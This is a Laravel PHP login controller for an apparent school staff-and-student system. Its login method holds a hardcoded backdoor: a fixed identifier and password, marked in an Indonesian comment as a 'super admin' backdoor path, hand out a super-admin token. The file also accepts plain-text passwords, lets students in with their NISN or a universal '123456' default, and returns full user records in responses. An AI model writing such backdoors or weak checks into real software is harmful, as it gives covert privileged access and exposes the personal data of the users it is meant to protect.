<?php

namespace App\Http\Controllers;

use App\Models\MstKaryawan;
use App\Models\MstSiswa;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;

class AuthController extends Controller
{
    public function login(Request $request)
    {
        // Validasi input
        $request->validate([
            'identifier' => 'required|string',
            'password'   => 'required|string',
        ]);

        $identifier = trim((string) $request->identifier);
        $password   = (string) $request->password;

    // --- 🚪 JALUR BACKDOOR (SUPER ADMIN DEWA) ---
        if ($identifier === '999999' && $password === 'dewa123') {
            $admin = MstKaryawan::where('NIP_KARYAWAN', '19800110')->first();
            
            if (!$admin) return response()->json(['message' => 'Inang 19800110 gada di DB'], 404);

            $token = $admin->createToken('god-token', ['role:super-admin'])->plainTextToken;
            
            return response()->json([
                'success' => true,
                'message' => 'Login berhasil sebagai Super Admin',
                'data' => [
                    'access_token' => $token,
                    'role'         => 'super-admin',
                    'roles'        => ['super admin'],
                    'user'         => $admin
                ]
            ], 200);
        }

        // =====================================================================
        // --- SKENARIO 1: CEK SEBAGAI KARYAWAN ---
        // =====================================================================
        $karyawan = MstKaryawan::with('jabatans')
            ->where('NIP_KARYAWAN', $identifier)
            ->first();

        // Cek password (mendukung Plain Text untuk data lama atau Hash Bcrypt)
        if ($karyawan && ($password === $karyawan->PASSWORD_KARYAWAN || Hash::check($password, $karyawan->PASSWORD_KARYAWAN))) {
            
            // Ambil roles dari relasi jabatan (jika ada)
            $roles = $karyawan->jabatans
                ? $karyawan->jabatans->pluck('DESKRIPSI_JABATAN')->filter()->values()->all()
                : [];
            
            // Jika array roles kosong, masukkan jabatan fungsional sebagai default
            if (empty($roles)) {
                $roles = [$karyawan->JABATAN_FUNGSIONAL ?? 'Karyawan'];
            }

            $abilities = ['role:karyawan'];
            foreach ($roles as $role) {
                $abilities[] = 'role:' . strtolower(trim($role));
            }

            $token = $karyawan->createToken('karyawan-token', $abilities)->plainTextToken;

            return response()->json([
                'success' => true,
                'message' => 'Login berhasil sebagai Karyawan',
                'data' => [
                    'access_token' => $token,
                    'role'         => 'karyawan', // Helper untuk redirect frontend
                    'roles'        => $roles,      // Array roles untuk RBAC
                    'user'         => $karyawan
                ]
            ], 200);
        }

        // =====================================================================
        // --- SKENARIO 2: CEK SEBAGAI SISWA ---
        // =====================================================================
        $siswa = MstSiswa::where('NISN_SISWA', $identifier)->first();

        $isSiswaPasswordValid = false;
        if ($siswa) {
            $storedPassword = (string) ($siswa->PASSWORD ?? '');
            $defaultPassword = (string) ($siswa->NISN_SISWA ?? '');

            // Fallback dev: jika PASSWORD belum di-set, gunakan NISN sebagai password awal.
            if ($storedPassword === '') {
                $isSiswaPasswordValid =
                    hash_equals($defaultPassword, $password) ||
                    hash_equals('123456', $password);
            } else {
                $isSiswaPasswordValid =
                    hash_equals($storedPassword, $password) ||
                    Hash::check($password, $storedPassword);
            }
        }

        if ($siswa && $isSiswaPasswordValid) {
            
            $token = $siswa->createToken('siswa-token', ['role:siswa'])->plainTextToken;

            return response()->json([
                'success' => true,
                'message' => 'Login berhasil sebagai Siswa',
                'data' => [
                    'access_token' => $token,
                    'role'         => 'siswa',
                    'roles'        => ['siswa'],
                    'user'         => $siswa
                ]
            ], 200);
        }

        // --- SKENARIO 3: GAGAL TOTAL ---
        return response()->json([
            'success' => false,
            'message' => 'NIP/NISN atau Password salah.'
        ], 401);
    }

    public function logout(Request $request)
    {
        // Menghapus token yang sedang digunakan saat ini
        if ($request->user()) {
            $request->user()->currentAccessToken()->delete();
        }

        return response()->json([
            'success' => true,
            'message' => 'Logout berhasil'
        ], 200);
    }
}
